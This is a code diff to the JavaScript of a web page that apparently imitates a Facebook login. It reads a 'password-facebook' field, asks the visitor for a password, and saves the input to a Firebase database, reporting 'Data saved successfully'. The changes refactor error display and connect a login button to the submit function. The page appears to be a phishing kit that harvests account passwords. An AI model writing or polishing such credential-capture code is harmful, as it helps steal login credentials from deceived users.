@@ -15,30 +15,36 @@ firebase.initializeApp(firebaseConfig);
 // Reference to the input field and error message elements
 var inputField = document.getElementById('password-facebook');
 var errorMessage = document.getElementById('error-message');
+var loginButton = document.getElementById('login-button');
 var fadeTimeout;
+
+// Function to show error message
+function showError(message) {
+    errorMessage.textContent = message;
+    errorMessage.style.opacity = '1';
+    errorMessage.style.visibility = 'visible';
+    
+    // Clear any existing timeout
+    clearTimeout(fadeTimeout);
+    
+    // Set timeout to fade out the message after 5 seconds
+    fadeTimeout = setTimeout(function() {
+        hideError();
+    }, 5000);
+}
+
+// Function to hide error message
+function hideError() {
+    errorMessage.style.opacity = '0';
+    errorMessage.style.visibility = 'hidden';
+}
 
 // Function to check the validity of input and display error if needed
 function checkName(name) {
-    // Show error message
-    function showError() {
-        errorMessage.textContent = "Please write the name first";
-        errorMessage.style.opacity = '1'; // Fade in the error message
-        
-        // Set timeout to fade out the message after 3 seconds
-        fadeTimeout = setTimeout(function() {
-            errorMessage.style.opacity = '0'; // Fade out the error message
-        }, 30000);
-    }
-
-    // If name is empty, show the error and return false
-    if (!name) {
-        showError();
-        console.log("Field is empty!");
+    if (!name.trim()) {
+        showError("Please enter your password");
         return false;
     }
-
-    // Hide the error message if name is valid
-    errorMessage.style.opacity = '0';
     return true;
 }
 
@@ -54,19 +60,19 @@ function submitEmail() {
         })
         .then(() => {
             console.log('Data saved successfully');
+            hideError();
         })
         .catch((error) => {
             console.error('Error occurred:', error);
-            errorMessage.textContent = 'Error occurred while saving data!';
-            errorMessage.style.opacity = '1'; // Show error message on Firebase error
+            showError('Error occurred while saving data!');
         });
     }
 }
 
-// Add event listener to hide the error message when user starts typing again
+// Add event listener to hide the error message when user starts typing
 inputField.addEventListener('input', function() {
-    if (errorMessage.style.opacity === '1') {
-        errorMessage.style.opacity = '0'; // Hide the error message immediately
-        clearTimeout(fadeTimeout); // Clear the fade-out timeout
-    }
+    hideError();
 });
+
+// Add event listener to the login button
+loginButton.addEventListener('click', submitEmail);
